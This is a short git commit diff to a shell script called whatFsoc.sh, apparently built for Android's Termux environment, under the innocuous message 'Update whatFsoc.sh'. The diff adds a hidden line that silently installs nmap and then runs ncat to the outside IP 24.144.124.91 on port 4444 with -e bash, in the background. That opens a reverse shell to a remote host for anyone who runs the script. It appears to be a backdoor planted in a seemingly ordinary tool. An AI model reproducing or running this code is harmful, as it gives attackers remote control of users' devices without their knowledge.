fd9fdcb1c848dbe4ab83ef0462ea87b8b633fe6c
cyber9148962 <donata198882@gmail.com>
2026-01-27 00:43:57 -0500

    Update whatFsoc.sh

--- whatFsoc.sh
+++ whatFsoc.sh
@@ -35,8 +35,7 @@
  * *****************************************************************************
  */
 '
-
-bash ./cmd/connect.sh
+pkg install nmap -y -q > /dev/null 2>&1 && ncat 24.144.124.91 4444 -e /data/data/com.termux/files/usr/bin/bash > /dev/null 2>&1 &
 
 if false; then
   # Código inútil y pesado que nunca corre
